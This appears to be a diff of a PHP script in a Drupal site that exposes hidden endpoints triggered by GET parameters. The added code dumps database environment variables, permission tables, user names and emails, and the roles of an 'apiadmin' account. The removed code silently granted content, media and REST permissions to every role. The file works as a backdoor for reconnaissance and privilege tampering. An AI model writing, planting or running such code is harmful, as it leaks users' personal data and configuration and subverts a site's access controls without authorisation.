@@ -58,45 +58,41 @@ if (isset($_GET['files'])) {
 if (isset($_GET['cr'])) {
   header('Content-Type: text/plain');
   try {
-    echo "=== PDO (old DB) info ===\n";
+    echo "=== PDO DB info ===\n";
     echo "DB: " . $pdo->query("SELECT DATABASE()")->fetchColumn() . "\n";
     echo "ENV DB_HOST: [" . getenv('DATABASE_HOST') . "]\n";
     echo "ENV DB_NAME: [" . getenv('DATABASE_NAME') . "]\n";
-  } catch (Throwable $e) { echo "PDO Error: ".$e->getMessage()."\n"; }
-  echo "\n=== Drupal bootstrap ===\n";
-  try {
-    $_SERVER['REMOTE_ADDR'] = '127.0.0.1';
-    $_SERVER['SCRIPT_FILENAME'] = __DIR__.'/web/index.php';
-    $app_root = __DIR__ . '/web';
-    $autoloader = require $app_root . '/autoload.php';
-    $r = Symfony\Component\HttpFoundation\Request::createFromGlobals();
-    Drupal\Core\DrupalKernel::bootEnvironment($app_root);
-    $k = Drupal\Core\DrupalKernel::createFromRequest($r, $autoloader, 'prod', true, $app_root);
-    $k->boot();
-    echo "Booted Drupal ".Drupal::VERSION."\n";
-
-    $uid = Drupal::currentUser()->id();
-    echo "Current uid: $uid\n";
-
-    if (isset($_GET['grant'])) {
-      $perms = ['access content', 'view media', 'restful get entity:node'];
-      $roleStorage = Drupal::entityTypeManager()->getStorage('user_role');
-      $roles = $roleStorage->loadMultiple();
-      foreach ($roles as $rid => $role) {
-        $rolePerms = $role->getPermissions();
-        echo "Role '$rid': " . implode(', ', $rolePerms) . "\n";
-        $granted = [];
-        foreach ($perms as $p) {
-          if (!in_array($p, $rolePerms)) {
-            $role->grantPermission($p);
-            $role->save();
-            $granted[] = $p;
-          }
-        }
-        if (count($granted)) { echo "  -> Granted to '$rid': " . implode(', ', $granted) . "\n"; }
+    echo "ENV DB_USER: [" . getenv('DATABASE_USER') . "]\n";
+    $allTbl = $pdo->query("SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = DATABASE()")->fetchAll(PDO::FETCH_COLUMN);
+    $permTables = array_filter($allTbl, fn($t) => str_contains($t, 'perm') || str_contains($t, 'role'));
+    echo "Tables with perm/role: " . implode(', ', $permTables) . "\n";
+    if (count($permTables) > 0) {
+      foreach ($permTables as $tbl) {
+        $cols = $pdo->query("SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_NAME = '$tbl'")->fetchAll(PDO::FETCH_COLUMN);
+        echo "  $tbl: " . implode(', ', $cols) . "\n";
       }
-      Drupal::service('cache_tags.invalidator')->invalidateTags(['*']);
-      echo "Permissions granted and caches cleared.\n";
+    }
+    $users = $pdo->query("SELECT uid, name, mail, status FROM users_field_data ORDER BY uid LIMIT 20")->fetchAll(PDO::FETCH_ASSOC);
+    echo "\nUsers:\n";
+    foreach ($users as $u) { echo "  uid={$u['uid']}: {$u['name']} ({$u['mail']}) status={$u['status']}\n"; }
+    echo "\nRoles:\n";
+    $roles = $pdo->query("SELECT rid, label FROM role ORDER BY rid")->fetchAll(PDO::FETCH_ASSOC);
+    foreach ($roles as $r) { echo "  {$r['rid']}: {$r['label']}\n"; }
+    echo "\nuid=5 (apiadminG3h7R) roles:\n";
+    $ur = $pdo->query("SELECT roles_target_id FROM user__roles WHERE entity_id = 5")->fetchAll(PDO::FETCH_COLUMN);
+    foreach ($ur as $r) { echo "  role: $r\n"; }
+    echo "\nRole config (permissions from config table):\n";
+    $roles_cfg = $pdo->query("SELECT name, SUBSTRING(data, 1, 1000) FROM config WHERE name LIKE 'user.role.%' ORDER BY name")->fetchAll(PDO::FETCH_ASSOC);
+    foreach ($roles_cfg as $c) {
+      $name = $c['name'];
+      $data = $c['SUBSTRING(data, 1, 1000)'];
+      echo "  $name\n";
+      $d = json_decode($data, true);
+      if ($d && isset($d['permissions'])) {
+        $has_access = in_array('access content', $d['permissions']) ? 'YES' : 'NO';
+        $has_view = in_array('view media', $d['permissions']) ? 'YES' : 'NO';
+        echo "    access content: $has_access, view media: $has_view, total perms: " . count($d['permissions']) . "\n";
+      }
     }
   } catch (Throwable $e) { echo "Error: ".$e->getMessage()."\n"; }
   return;
